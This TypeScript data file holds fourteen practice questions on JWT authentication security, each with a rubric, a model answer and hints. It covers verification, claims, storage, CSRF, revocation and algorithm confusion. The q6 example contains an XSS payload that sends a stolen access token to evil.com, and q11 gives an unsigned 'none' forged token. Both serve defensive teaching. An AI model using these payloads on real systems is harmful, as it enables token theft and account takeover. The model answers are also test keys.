import type { PracticeQuestion } from '../../types';
import { createRubric } from '../rubrics/helpers';

export const jwtQuestions: PracticeQuestion[] = [
  {
    id: 'jwt-q1-server-receives',
    topicId: 'jwt-authentication',
    category: 'mechanism',
    difficulty: 'foundation',
    prompt: 'What happens when a server receives a JWT on an API request?',
    rubric: createRubric({
      requiredConcepts: [
        'token extraction from Authorization header or cookie',
        'base64url decode of header and payload',
        'signature verification with secret or public key',
        'claim validation (exp, iss, aud)',
        'authorization decision after successful verification',
      ],
      mechanismSteps: [
        'Extract JWT from Authorization Bearer header or cookie',
        'Parse and base64url-decode header and payload',
        'Verify signature using configured secret or public key',
        'Validate exp, iss, aud, and other required claims',
        'Use sub and roles/scopes for authorization; reject with 401 if invalid',
      ],
      prohibitedClaims: [
        'JWT is encrypted by default',
        'server trusts payload without signature check',
        'base64 encoding provides confidentiality',
      ],
      terminologyKeywords: ['signature', 'claims', 'exp', 'sub', 'RS256', 'HMAC', '401'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q1-server-receives',
      questionId: 'jwt-q1-server-receives',
      topicId: 'jwt-authentication',
      estimatedSeconds: 80,
      definition:
        'A JWT is a compact, signed token carrying claims about a subject. The server must cryptographically verify it before trusting any claim.',
      mechanism:
        'The server extracts the token from the Authorization Bearer header or an HttpOnly cookie, splits it into header.payload.signature, and base64url-decodes the first two parts. It verifies the signature using the shared HMAC secret or the issuer public key (e.g., RS256). It then validates claims: exp must be in the future, iss and aud must match expected values, and required scopes or roles are checked before allowing the action.',
      benefit:
        'Enables stateless authentication across services when every node performs the same validation without a central session lookup on each request.',
      risk:
        'Skipping signature verification, accepting the "none" algorithm, or ignoring exp/aud allows forged or replayed tokens. Treating decoded payload as trusted before verification is a critical flaw.',
      example:
        'A microservice receives `Authorization: Bearer eyJhbGci...`, validates RS256 with the auth service public key, confirms exp is valid, reads sub=12345, and loads permissions before returning `/api/profile` data.',
      conclusion:
        'Receiving a JWT triggers verify-then-trust: signature and claim checks gate access; only after both pass does the server use claims for authorization.',
    },
    hints: [
      'Start with where the token comes from (header vs cookie).',
      'Mention signature verification before trusting claims.',
      'Include exp and at least one of iss or aud.',
    ],
  },
  {
    id: 'jwt-q2-long-lived-danger',
    topicId: 'jwt-authentication',
    category: 'risk-tradeoff',
    difficulty: 'intermediate',
    prompt: 'Why are long-lived JWTs dangerous?',
    rubric: createRubric({
      requiredConcepts: [
        'stolen token remains valid until expiry',
        'stateless JWTs lack instant server-side invalidation',
        'wider exposure window for XSS or leakage',
        'refresh token rotation as mitigation',
      ],
      mechanismSteps: [
        'JWT validity is time-bound by exp claim',
        'Stolen bearer token works for any holder until expiry',
        'Pure stateless design has no server-side session to revoke',
        'Long TTL increases blast radius of theft or mis-issuance',
        'Mitigate with short access TTL, refresh rotation, and blocklists',
      ],
      prohibitedClaims: [
        'long-lived JWTs are safe if signed',
        'logout automatically invalidates stateless JWTs',
        'HTTPS alone prevents token theft',
      ],
      terminologyKeywords: ['exp', 'TTL', 'revocation', 'refresh token', 'bearer', 'blast radius'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q2-long-lived-danger',
      questionId: 'jwt-q2-long-lived-danger',
      topicId: 'jwt-authentication',
      estimatedSeconds: 75,
      definition:
        'A long-lived JWT is an access token with a distant expiration, meaning a compromised token grants unauthorized access for an extended period.',
      mechanism:
        'JWTs are self-contained proofs: anyone holding the token can present it until exp. In stateless designs the server does not store active sessions, so changing user permissions or logging out does not invalidate already-issued tokens unless extra infrastructure (deny lists, session store, key rotation) is added. A longer TTL widens the window where theft via XSS, logs, or device compromise succeeds.',
      benefit:
        'Longer TTLs reduce refresh traffic and simplify clients that cannot rotate tokens frequently—acceptable only with low-risk APIs and strong compensating controls.',
      risk:
        'Stolen tokens cannot be recalled quickly; insider or attacker access persists. Mis-issued tokens with wrong roles remain valid. Regulatory or incident response may require immediate revocation that long TTLs prevent.',
      example:
        'An access JWT with exp 30 days stolen from localStorage lets an attacker call APIs as the victim for weeks unless the org maintains a token blocklist or rotates signing keys with forced re-auth.',
      conclusion:
        'Prefer short-lived access tokens (minutes), pair with refresh rotation, and add revocation mechanisms when immediate invalidation matters.',
    },
    hints: [
      'Connect TTL to how long a stolen token works.',
      'Explain why stateless JWTs make logout and revocation hard.',
      'Mention short access tokens and refresh tokens as mitigation.',
    ],
  },
  {
    id: 'jwt-q3-auth-vs-authz',
    topicId: 'jwt-authentication',
    category: 'comparison',
    difficulty: 'foundation',
    prompt: 'What is the difference between authentication and authorization in JWT-based systems?',
    rubric: createRubric({
      requiredConcepts: [
        'authentication proves identity (who)',
        'authorization decides permitted actions (what)',
        'JWT proves authentication via verified claims',
        'authorization requires additional policy checks',
      ],
      mechanismSteps: [
        'User authenticates (credentials, MFA, OAuth)',
        'Server issues JWT with sub and possibly roles/scopes',
        'Resource server verifies JWT (authentication proof)',
        'Application checks roles/scopes against requested action (authorization)',
      ],
      prohibitedClaims: [
        'JWT automatically grants all permissions',
        'authentication and authorization are the same step',
        'a valid JWT means the user may do anything',
      ],
      terminologyKeywords: ['authentication', 'authorization', 'sub', 'roles', 'scopes', 'RBAC'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q3-auth-vs-authz',
      questionId: 'jwt-q3-auth-vs-authz',
      topicId: 'jwt-authentication',
      estimatedSeconds: 70,
      definition:
        'Authentication establishes who the user is; authorization determines what that identity is allowed to do. A JWT typically serves as proof of authentication, not a substitute for authorization policy.',
      mechanism:
        'During login the identity provider authenticates the user and embeds claims such as sub, roles, or scopes in a signed JWT. On each request the API verifies the signature and expiry—confirming the token is genuine and the identity is authenticated. Authorization is a separate step: the handler checks whether sub or scope claims permit the operation (e.g., delete user, read billing). Missing or insufficient claims yield 403 Forbidden even when authentication (401 vs 403 distinction) succeeded.',
      benefit:
        'Clear separation lets microservices trust a common identity proof while enforcing service-specific authorization rules.',
      risk:
        'Treating any valid JWT as full access, over-scoping tokens, or storing permissions only in the client without server-side checks leads to privilege escalation.',
      example:
        'A valid JWT proves Alice is user 42 (authentication). Deleting user 99 requires an admin role check in the API (authorization)—Alice token alone is insufficient.',
      conclusion:
        'Verify the JWT for authentication; enforce least-privilege authorization on every sensitive action regardless of token validity.',
    },
    hints: [
      'Use "who" vs "what" framing.',
      'JWT verification is authentication; role/scope checks are authorization.',
      'Mention 401 vs 403 if relevant.',
    ],
  },
  {
    id: 'jwt-q4-signing',
    topicId: 'jwt-authentication',
    category: 'mechanism',
    difficulty: 'intermediate',
    prompt: 'How does JWT signing work, and what is the difference between symmetric (HS256) and asymmetric (RS256) signing?',
    rubric: createRubric({
      requiredConcepts: [
        'signature over header.payload',
        'HMAC with shared secret for symmetric',
        'private key sign / public key verify for asymmetric',
        'verifier must use correct key material',
      ],
      mechanismSteps: [
        'Encode header and payload as base64url',
        'Compute signature over concatenated header.payload',
        'HS256: HMAC-SHA256 with shared secret',
        'RS256: RSA signature with private key; verify with public key',
        'Reject token if signature does not match',
      ],
      prohibitedClaims: [
        'signing encrypts the payload',
        'any service can verify HS256 without the secret',
        'asymmetric signing uses the same private key to verify',
      ],
      terminologyKeywords: ['HMAC', 'HS256', 'RS256', 'private key', 'public key', 'integrity'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q4-signing',
      questionId: 'jwt-q4-signing',
      topicId: 'jwt-authentication',
      estimatedSeconds: 85,
      definition:
        'JWT signing provides integrity and issuer authenticity by attaching a cryptographic signature over the header and payload. It does not hide claim contents.',
      mechanism:
        'The issuer base64url-encodes the header (alg, typ) and payload (claims), joins them with a dot, and signs that string. HS256 uses HMAC-SHA256 with a shared secret—both issuer and every verifier need the same secret. RS256 uses the issuer private key to sign; verifiers only need the public key, which is safer to distribute to many microservices. Receivers recompute or verify the signature and reject tampered tokens.',
      benefit:
        'Asymmetric signing scales in microservice architectures: auth service holds the private key; APIs verify with published JWKS without sharing signing secrets.',
      risk:
        'Weak HMAC secrets enable brute-force forgery. Leaked HS256 secrets compromise all verifiers. Key management and algorithm allowlisting are essential.',
      example:
        'An OAuth server signs access tokens with RS256; API gateways fetch `/.well-known/jwks.json` and validate signatures without storing the signing private key.',
      conclusion:
        'Signing ensures tokens were issued by a trusted party and were not altered; choose HS256 for simple trusted pairs, RS256 when many verifiers need safe key distribution.',
    },
    hints: [
      'Signature covers header.payload, not encryption.',
      'Contrast shared secret vs public/private key pair.',
      'Mention JWKS for RS256 verification.',
    ],
  },
  {
    id: 'jwt-q5-cookies',
    topicId: 'jwt-authentication',
    category: 'architecture',
    difficulty: 'intermediate',
    prompt: 'What are the security considerations when storing JWTs in cookies versus sending them in the Authorization header?',
    rubric: createRubric({
      requiredConcepts: [
        'HttpOnly prevents JavaScript access',
        'Secure flag for HTTPS only',
        'SameSite mitigates CSRF',
        'bearer tokens in headers avoid automatic CSRF send but need XSS-safe storage',
      ],
      mechanismSteps: [
        'Cookie: Set-Cookie with HttpOnly, Secure, SameSite',
        'Browser attaches cookie on same-site or configured cross-site requests',
        'Authorization header: client must explicitly attach Bearer token',
        'Evaluate CSRF vs XSS tradeoffs for each transport',
        'Use anti-CSRF tokens or SameSite when cookies authenticate state-changing requests',
      ],
      prohibitedClaims: [
        'cookies are always less secure than headers',
        'localStorage cookies are the same as HttpOnly cookies',
        'SameSite is unnecessary for JWT cookies',
      ],
      terminologyKeywords: ['HttpOnly', 'Secure', 'SameSite', 'CSRF', 'Bearer', 'Set-Cookie'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q5-cookies',
      questionId: 'jwt-q5-cookies',
      topicId: 'jwt-authentication',
      estimatedSeconds: 80,
      definition:
        'JWTs can be transported in HttpOnly cookies or Authorization headers. Each path has different XSS and CSRF implications that must be designed explicitly.',
      mechanism:
        'HttpOnly cookies are not readable by JavaScript, reducing XSS token exfiltration compared to localStorage. Secure ensures HTTPS-only transmission. SameSite=Lax or Strict limits cross-site cookie submission, mitigating CSRF on cookie-authenticated requests. Bearer tokens in Authorization headers are not sent automatically by browsers, which reduces CSRF but often pushes storage to memory or localStorage—exposing them to XSS if scripts are compromised.',
      benefit:
        'HttpOnly cookie transport combines automatic submission with reduced script access, suitable for browser sessions when CSRF defenses are in place.',
      risk:
        'Cookie-based auth without SameSite or CSRF tokens allows cross-site request forgery. Header-based auth in localStorage is vulnerable to any XSS. Neither transport fixes XSS alone—input sanitization and CSP still matter.',
      example:
        'A SPA stores refresh token in HttpOnly Secure SameSite=Strict cookie; access token stays in memory. API expects cookie on same-origin requests and validates CSRF token on POST.',
      conclusion:
        'Choose cookie vs header based on client type and threat model; apply HttpOnly/Secure/SameSite for cookies and avoid persistent script-accessible storage for bearer tokens.',
    },
    hints: [
      'HttpOnly protects against JavaScript reading the token.',
      'SameSite relates to CSRF, not XSS alone.',
      'Bearer in localStorage is XSS-exposed.',
    ],
  },
  {
    id: 'jwt-q6-xss',
    topicId: 'jwt-authentication',
    category: 'scenario',
    difficulty: 'intermediate',
    prompt: 'How does XSS threaten JWT-based authentication, and what storage and transport choices reduce that risk?',
    rubric: createRubric({
      requiredConcepts: [
        'XSS allows attacker script to run in victim browser',
        'localStorage/sessionStorage readable by injected script',
        'HttpOnly cookies not accessible to JavaScript',
        'short TTL limits stolen token utility',
      ],
      mechanismSteps: [
        'Attacker injects script via vulnerable page',
        'Script reads token from localStorage or non-HttpOnly cookie',
        'Script exfiltrates token to attacker server',
        'Attacker replays JWT as bearer until expiry',
        'Mitigate with HttpOnly cookies, CSP, input encoding, short access TTL',
      ],
      prohibitedClaims: [
        'HTTPS prevents XSS token theft',
        'signed JWTs cannot be stolen',
        'XSS only affects passwords not tokens',
      ],
      terminologyKeywords: ['XSS', 'HttpOnly', 'localStorage', 'CSP', 'exfiltration', 'bearer'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q6-xss',
      questionId: 'jwt-q6-xss',
      topicId: 'jwt-authentication',
      estimatedSeconds: 75,
      definition:
        'Cross-site scripting lets attacker-controlled JavaScript run in the victim browser, potentially stealing JWTs stored where scripts can read them.',
      mechanism:
        'If a JWT sits in localStorage or a non-HttpOnly cookie, any successful XSS payload can call getItem or document.cookie and send the token to an attacker. Because JWTs are bearer credentials, the attacker replays the token from their own client until expiry. HttpOnly cookies block direct script access to the cookie value. Content-Security-Policy and rigorous output encoding reduce XSS likelihood. Short-lived access tokens narrow the replay window.',
      benefit:
        'Layered XSS defenses plus HttpOnly storage materially reduce the chance and impact of token theft in browser apps.',
      risk:
        'SPAs commonly use localStorage for convenience—convenient for developers, dangerous under XSS. HttpOnly does not stop the browser from sending the cookie on requests triggered by XSS (same-origin actions).',
      example:
        'Stored XSS in a comment field runs `fetch("https://evil.com?t="+localStorage.getItem("access_token"))`, compromising every user who views the comment.',
      conclusion:
        'Treat XSS as a token theft vector: prefer HttpOnly cookies or in-memory tokens, prevent XSS at the source, and keep access token TTL short.',
    },
    hints: [
      'XSS = attacker JavaScript in your origin.',
      'localStorage is fully readable by scripts.',
      'HttpOnly cookies cannot be read via document.cookie for that cookie.',
    ],
  },
  {
    id: 'jwt-q7-revocation',
    topicId: 'jwt-authentication',
    category: 'troubleshooting',
    difficulty: 'assessment',
    prompt: 'Why is JWT revocation difficult in stateless architectures, and what strategies address logout and compromised tokens?',
    rubric: createRubric({
      requiredConcepts: [
        'stateless servers do not track issued tokens by default',
        'logout does not invalidate existing JWT without extra state',
        'short TTL and refresh token rotation',
        'deny lists, session store, or key rotation for forced invalidation',
      ],
      mechanismSteps: [
        'Identify that valid signature + unexpired token is accepted',
        'Recognize logout requires server-side action beyond client delete',
        'Apply short access token lifetime',
        'Rotate or revoke refresh tokens on logout',
        'Use token blocklist or session version claim for immediate invalidation',
      ],
      prohibitedClaims: [
        'deleting token on client revokes it server-side',
        'stateless JWTs support instant revocation with no tradeoffs',
        'refresh tokens never need rotation',
      ],
      terminologyKeywords: ['revocation', 'blocklist', 'refresh rotation', 'session store', 'jti', 'logout'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q7-revocation',
      questionId: 'jwt-q7-revocation',
      topicId: 'jwt-authentication',
      estimatedSeconds: 90,
      definition:
        'Revocation means invalidating a token before its exp. Pure stateless JWT verification accepts any structurally valid, unexpired token with no server memory of issuance.',
      mechanism:
        'Once issued, a JWT is valid until exp unless verifiers consult additional state. Client-side logout only removes local copies. Strategies include: very short access tokens; refresh tokens stored server-side or in HttpOnly cookies with rotation on each use; maintaining a deny list of jti or token IDs (often Redis) checked on each request; embedding a session version claim bumped on logout/password change; or rotating signing keys to invalidate all outstanding tokens during incidents.',
      benefit:
        'Short TTL plus refresh rotation balances scalability with reasonable logout behavior for most web apps.',
      risk:
        'Deny lists reintroduce centralized state and latency. Blocklists that grow unbounded are operationally hard. Without any strategy, stolen tokens remain usable until natural expiry.',
      example:
        'On logout the auth service increments user session_version in DB; JWTs carry session_version claim; APIs reject tokens whose version is stale. Refresh token is deleted from server store.',
      conclusion:
        'Plan revocation explicitly—stateless verification alone is insufficient when logout, role changes, or compromise response require immediate cut-off.',
    },
    hints: [
      'Valid signature + not expired = accepted by default.',
      'Client deleting token is not server revocation.',
      'Name at least two strategies: short TTL, blocklist, rotation, version claim.',
    ],
  },
  {
    id: 'jwt-q8-algorithm-confusion',
    topicId: 'jwt-authentication',
    category: 'mechanism',
    difficulty: 'assessment',
    prompt: 'What is the JWT algorithm confusion vulnerability, and how do you prevent it?',
    rubric: createRubric({
      requiredConcepts: [
        'attacker changes alg in header to HS256',
        'server verifies HMAC using public key as secret',
        'must allowlist expected algorithm',
        'use library APIs that bind algorithm to key type',
      ],
      mechanismSteps: [
        'Legitimate tokens use RS256 with RSA public/private keys',
        'Attacker sets header alg to HS256',
        'Attacker signs with HMAC using the RSA public key as secret',
        'Vulnerable server uses public key bytes as HMAC secret and accepts forgery',
        'Prevent by fixed algorithm allowlist and separate key handling per alg',
      ],
      prohibitedClaims: [
        'algorithm confusion is fixed by using HTTPS',
        'trusting the header alg field is safe',
        'any key type works for any algorithm',
      ],
      terminologyKeywords: ['algorithm confusion', 'HS256', 'RS256', 'allowlist', 'none', 'forge'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q8-algorithm-confusion',
      questionId: 'jwt-q8-algorithm-confusion',
      topicId: 'jwt-authentication',
      estimatedSeconds: 85,
      definition:
        'Algorithm confusion occurs when a verifier accepts an unexpected signing algorithm—often switching RS256 to HS256—allowing an attacker to forge tokens using the public key as an HMAC secret.',
      mechanism:
        'In a flawed implementation the server reads alg from the JWT header and verifies accordingly. Tokens are normally RS256-signed with a private key and verified with the public key. An attacker changes alg to HS256 and computes HMAC-SHA256 over header.payload using the publicly known RSA public key as the HMAC secret. If the server treats the public key PEM as the HS256 secret, the forgery verifies. Prevention: hardcode an allowlist of algorithms (e.g., only RS256), reject "none", use vetted libraries that require specifying verification key type separately from the header, and never use the public key material as an HMAC secret.',
      benefit:
        'Strict algorithm pinning closes a historic class of JWT bypass bugs that turned asymmetric trust into symmetric forgery.',
      risk:
        'Custom JWT parsing, outdated libraries, and accepting multiple algs without separate keys remain vulnerable. Publishing JWKS does not help if verifiers misuse the key.',
      example:
        'CVE-class pattern: API docs publish RS256 public key; attacker crafts HS256 token signed with that key string; vulnerable middleware accepts it and sets sub=admin.',
      conclusion:
        'Never trust the token alg header blindly—enforce expected algorithms in application configuration and use maintained JWT libraries correctly.',
    },
    hints: [
      'Attack switches asymmetric verification to symmetric HMAC.',
      'Public key becomes the HMAC secret in the bug.',
      'Fix: allowlist alg, reject none, use library correctly.',
    ],
  },
  {
    id: 'jwt-q9-access-refresh',
    topicId: 'jwt-authentication',
    category: 'comparison',
    difficulty: 'intermediate',
    prompt: 'What roles do access tokens and refresh tokens play, and how should their lifetimes and storage differ?',
    rubric: createRubric({
      requiredConcepts: [
        'access token used for API authorization',
        'refresh token obtains new access tokens',
        'short access TTL limits exposure',
        'refresh token needs stricter storage and rotation',
      ],
      mechanismSteps: [
        'User authenticates and receives both token types',
        'Client sends short-lived access JWT on API calls',
        'On 401/expiry client presents refresh token to token endpoint',
        'Server issues new access token and optionally rotates refresh',
        'Store refresh in HttpOnly cookie or server-side session',
      ],
      prohibitedClaims: [
        'access and refresh tokens are interchangeable',
        'refresh tokens should live in localStorage',
        'access tokens should last months',
      ],
      terminologyKeywords: ['access token', 'refresh token', 'rotation', 'TTL', 'OAuth', 'token endpoint'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q9-access-refresh',
      questionId: 'jwt-q9-access-refresh',
      topicId: 'jwt-authentication',
      estimatedSeconds: 75,
      definition:
        'Access tokens authorize API requests and should be short-lived. Refresh tokens are long-lived credentials used only to obtain new access tokens at the token endpoint.',
      mechanism:
        'After login the client holds a 5–15 minute access JWT for resource calls and a refresh token for renewal. When access expires, the client POSTs the refresh token to /oauth/token; the server validates it, optionally detects reuse, rotates refresh, and returns a fresh access JWT. Access tokens may be JWTs; refresh tokens are often opaque random strings stored server-side. Refresh belongs in HttpOnly Secure cookies or secure server storage—not localStorage.',
      benefit:
        'Short access TTL shrinks theft window while refresh flow maintains user session without constant re-login.',
      risk:
        'Refresh token theft is high impact; missing rotation or reuse detection enables persistent account takeover. Long-lived access tokens negate the pattern benefits.',
      example:
        'Mobile app keeps 10-minute access JWT in memory; refresh in Keychain. Web app uses HttpOnly refresh cookie; silent refresh via backend before API calls.',
      conclusion:
        'Split lifetimes and storage: brief access for APIs, closely guarded refresh with rotation for session continuity.',
    },
    hints: [
      'Access = API calls; refresh = get new access.',
      'Short access, longer but protected refresh.',
      'Mention rotation on refresh.',
    ],
  },
  {
    id: 'jwt-q10-claims-validation',
    topicId: 'jwt-authentication',
    category: 'mechanism',
    difficulty: 'intermediate',
    prompt: 'Which JWT claims should servers validate beyond signature, and what goes wrong if iss or aud are ignored?',
    rubric: createRubric({
      requiredConcepts: [
        'exp and nbf for time validity',
        'iss identifies token issuer',
        'aud identifies intended recipient',
        'sub identifies subject',
      ],
      mechanismSteps: [
        'Verify signature first',
        'Reject if current time past exp or before nbf',
        'Match iss against trusted issuer URL or value',
        'Match aud against this service client ID or API identifier',
        'Use sub and custom claims for authorization',
      ],
      prohibitedClaims: [
        'only signature matters',
        'aud is optional in all deployments',
        'exp can be ignored if signature valid',
      ],
      terminologyKeywords: ['exp', 'iss', 'aud', 'sub', 'nbf', 'clock skew', 'claim'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q10-claims-validation',
      questionId: 'jwt-q10-claims-validation',
      topicId: 'jwt-authentication',
      estimatedSeconds: 80,
      definition:
        'Standard JWT claims constrain where and when a token is valid. Validating them prevents accepting correctly signed tokens meant for another service or time window.',
      mechanism:
        'After signature verification, check exp (and nbf if present) with modest clock skew. iss must match the expected identity provider—reject tokens from untrusted issuers. aud must include this API or resource server identifier; otherwise a token issued for another client or microservice could be replayed here. sub identifies the user or service account for authorization. Optional claims like azp, scope, or roles drive fine-grained access.',
      benefit:
        'Claim validation confines tokens to intended recipients and time, critical in multi-tenant and microservice environments sharing the same auth server.',
      risk:
        'Accepting any signed token from the auth server without aud check allows cross-service token replay. Ignoring exp permits indefinite use if revocation is absent.',
      example:
        'Staging and production share an issuer but different aud values. Without aud validation a staging token works against production API.',
      conclusion:
        'Treat claim validation as mandatory: exp, iss, and aud are as important as signature for correct JWT acceptance.',
    },
    hints: [
      'exp = expiry; iss = who issued; aud = who may consume.',
      'Cross-service replay happens when aud is skipped.',
      'Mention small clock skew tolerance for exp.',
    ],
  },
  {
    id: 'jwt-q11-none-algorithm',
    topicId: 'jwt-authentication',
    category: 'troubleshooting',
    difficulty: 'intermediate',
    prompt: 'Why must servers reject JWTs using the "none" algorithm, and how does this relate to algorithm allowlisting?',
    rubric: createRubric({
      requiredConcepts: [
        '"none" means unsigned token',
        'attacker forges payload without secret',
        'allowlist only expected algorithms',
        'reject unsigned or unexpected alg values',
      ],
      mechanismSteps: [
        'Attacker sets header alg to none',
        'Attacker supplies arbitrary payload claims',
        'Leaves signature empty or omits verification',
        'Vulnerable library skips verification for none',
        'Server must explicitly disallow none and verify all accepted algs',
      ],
      prohibitedClaims: [
        'none is safe for internal APIs',
        'base64 encoding is sufficient integrity',
        'development environments can accept none',
      ],
      terminologyKeywords: ['none', 'unsigned', 'allowlist', 'alg', 'forgery', 'verification'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q11-none-algorithm',
      questionId: 'jwt-q11-none-algorithm',
      topicId: 'jwt-authentication',
      estimatedSeconds: 70,
      definition:
        'The "none" algorithm indicates an unsecured JWT with no signature. Accepting it allows anyone to craft arbitrary claims.',
      mechanism:
        'An attacker sets {"alg":"none"} in the header, base64url-encodes a payload with admin claims, and appends an empty signature segment. Legacy or misconfigured verifiers that treat none as valid skip cryptographic checks. Secure implementations maintain an explicit allowlist (e.g., RS256 only), reject none and unexpected algorithms before parsing claims, and use library options that forbid unsecured JWTs.',
      benefit:
        'Disallowing none closes trivial forgery where no key material is needed to mint accepted tokens.',
      risk:
        'Mixed environments and copy-pasted tutorial code sometimes leave none enabled. Algorithm confusion and none acceptance are common JWT implementation failures.',
      example:
        'Pen tester sends `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.` to admin API; weak parser accepts unsigned token.',
      conclusion:
        'Hard-reject none and any algorithm not explicitly configured—unsigned JWTs must never authenticate production requests.',
    },
    hints: [
      'none = no signature.',
      'Attacker crafts any claims without a key.',
      'Part of broader algorithm allowlisting.',
    ],
  },
  {
    id: 'jwt-q12-encoding-not-encryption',
    topicId: 'jwt-authentication',
    category: 'definition',
    difficulty: 'foundation',
    prompt: 'Are JWT payloads confidential? Explain the difference between signing, encoding, and encryption in JWTs.',
    rubric: createRubric({
      requiredConcepts: [
        'base64url is encoding not encryption',
        'signed JWT provides integrity not confidentiality',
        'anyone can decode payload',
        'JWE for encrypted tokens when confidentiality needed',
      ],
      mechanismSteps: [
        'Recognize JWT parts are base64url-encoded JSON',
        'Explain signing proves integrity and issuer',
        'State payload is readable by anyone with the token',
        'Never put secrets or PII unnecessarily in claims',
        'Mention JWE when encryption is required',
      ],
      prohibitedClaims: [
        'JWT encrypts user data by default',
        'base64 hides sensitive information',
        'signed tokens cannot be read',
      ],
      terminologyKeywords: ['base64url', 'JWS', 'JWE', 'signing', 'encryption', 'integrity', 'confidentiality'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q12-encoding-not-encryption',
      questionId: 'jwt-q12-encoding-not-encryption',
      topicId: 'jwt-authentication',
      estimatedSeconds: 70,
      definition:
        'A standard signed JWT (JWS) is only encoded and signed—anyone holding the token can base64url-decode and read the payload. Signing provides integrity, not confidentiality.',
      mechanism:
        'Header and payload are JSON base64url-encoded for transport, not encrypted. The signature ensures they were not tampered with and came from the issuer. Attackers or intermediaries who intercept the token can read claims such as email or roles. Sensitive data should not be placed in JWTs unless using JSON Web Encryption (JWE) or keeping tokens entirely server-side.',
      benefit:
        'Signed claims let receivers trust content without encryption overhead when payload disclosure to the holder is acceptable.',
      risk:
        'Developers store PII, permissions, or internal IDs in JWTs assuming privacy. Logs, browser devtools, and proxies expose bearer tokens routinely.',
      example:
        'Pasting a JWT into jwt.io reveals payload JSON instantly despite valid HS256 signature.',
      conclusion:
        'Treat JWT payload as public to whoever has the token; use signing for integrity, JWE or opaque tokens when claims must stay confidential.',
    },
    hints: [
      'Anyone can decode base64url at jwt.io.',
      'Signing ≠ encryption.',
      'JWE is the encrypted JWT format.',
    ],
  },
  {
    id: 'jwt-q13-csrf-with-cookies',
    topicId: 'jwt-authentication',
    category: 'scenario',
    difficulty: 'assessment',
    prompt: 'You store JWTs in cookies for a browser application. What CSRF risks arise and how do you mitigate them?',
    rubric: createRubric({
      requiredConcepts: [
        'browsers auto-send cookies on cross-site requests',
        'CSRF forces victim browser to call authenticated endpoints',
        'SameSite cookie attribute',
        'CSRF tokens or custom headers for state-changing requests',
      ],
      mechanismSteps: [
        'Cookie-based auth sends JWT automatically on matching requests',
        'Malicious site triggers victim browser to POST to your API',
        'API sees valid cookie and performs action',
        'Set SameSite=Lax or Strict on auth cookie',
        'Require CSRF token or custom header for mutations',
      ],
      prohibitedClaims: [
        'JWT in cookie eliminates CSRF',
        'CORS alone prevents CSRF',
        'GET requests never need CSRF protection',
      ],
      terminologyKeywords: ['CSRF', 'SameSite', 'double-submit', 'custom header', 'cookie', 'state-changing'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q13-csrf-with-cookies',
      questionId: 'jwt-q13-csrf-with-cookies',
      topicId: 'jwt-authentication',
      estimatedSeconds: 80,
      definition:
        'When authentication cookies are sent automatically, cross-site request forgery can trick a logged-in user browser into making authenticated state-changing requests the user did not intend.',
      mechanism:
        'A victim visits evil.com while logged into bank.com. evil.com page submits a form or fetch to bank.com/transfer with the victim cookie attached. The API validates the JWT cookie and executes the transfer. Mitigations: SameSite=Lax or Strict limits cross-site cookie inclusion; double-submit or synchronizer CSRF tokens validate intent; requiring a custom header (e.g., X-Requested-With) blocks simple cross-site form posts; use separate cookie for session vs CSRF token pattern.',
      benefit:
        'SameSite plus CSRF tokens preserve HttpOnly XSS benefits while closing cross-site action forgery.',
      risk:
        'SameSite=None without Secure is needed for some cross-site flows but widens CSRF surface—must pair with explicit CSRF defenses. Bearer-header SPAs shift risk to XSS instead.',
      example:
        'Attacker img tag POSTs to /api/delete-account; victim session cookie authenticates request unless SameSite and CSRF token are enforced.',
      conclusion:
        'Cookie JWT auth demands CSRF controls—SameSite is necessary but not always sufficient for every cross-site integration.',
    },
    hints: [
      'Cookies ride along on requests the user did not consciously make.',
      'SameSite reduces cross-site cookie sending.',
      'CSRF token proves request came from your UI.',
    ],
  },
  {
    id: 'jwt-q14-logout-design',
    topicId: 'jwt-authentication',
    category: 'architecture',
    difficulty: 'pressure',
    prompt: 'Design logout for a SPA using JWT access tokens and refresh tokens. What must the client and server each do?',
    rubric: createRubric({
      requiredConcepts: [
        'client clears local access token',
        'server invalidates refresh token',
        'optional access token blocklist or short TTL',
        'cookie clearing with matching attributes',
      ],
      mechanismSteps: [
        'Client calls server logout endpoint',
        'Server deletes/revokes refresh token record',
        'Server clears HttpOnly refresh cookie if used',
        'Client wipes in-memory access token',
        'Optional: bump session version or blocklist access jti until exp',
      ],
      prohibitedClaims: [
        'client-only logout is sufficient',
        'clearing localStorage revokes server trust',
        'refresh tokens need no server-side invalidation',
      ],
      terminologyKeywords: ['logout', 'refresh revocation', 'HttpOnly', 'blocklist', 'session version', 'SPA'],
    }),
    modelAnswer: {
      id: 'jwt-ma-q14-logout-design',
      questionId: 'jwt-q14-logout-design',
      topicId: 'jwt-authentication',
      estimatedSeconds: 90,
      definition:
        'Logout must end the server-trusted session, not only remove tokens from the browser. That requires revoking refresh credentials and clearing client state.',
      mechanism:
        'Client invokes POST /logout. Server identifies the refresh token (cookie or body), deletes it from the token store or marks it revoked, and responds with Set-Cookie clearing the HttpOnly refresh cookie (matching Path, Domain, Secure). Client discards in-memory access JWT and resets app auth state. Because access JWT may remain valid until exp, keep access TTL short (minutes) or maintain a deny list of jti until expiry for high-assurance apps. Rotation should detect refresh reuse after logout.',
      benefit:
        'Proper server-side refresh revocation prevents silent re-authentication after user chose to sign out.',
      risk:
        'Client-only logout leaves refresh token valid—any copied refresh still obtains access. Stolen access token works until exp unless blocklisted.',
      example:
        'User clicks Sign out; SPA calls logout; server removes refresh hash from Redis and expires cookie; attacker with old refresh gets invalid_grant on next refresh.',
      conclusion:
        'Logout is a coordinated client wipe plus server refresh revocation; short access TTL limits residual access token risk.',
    },
    hints: [
      'Refresh token must be invalidated server-side.',
      'Access token may still work until exp unless blocklisted.',
      'Clear HttpOnly cookie with proper Set-Cookie attributes.',
    ],
  },
];
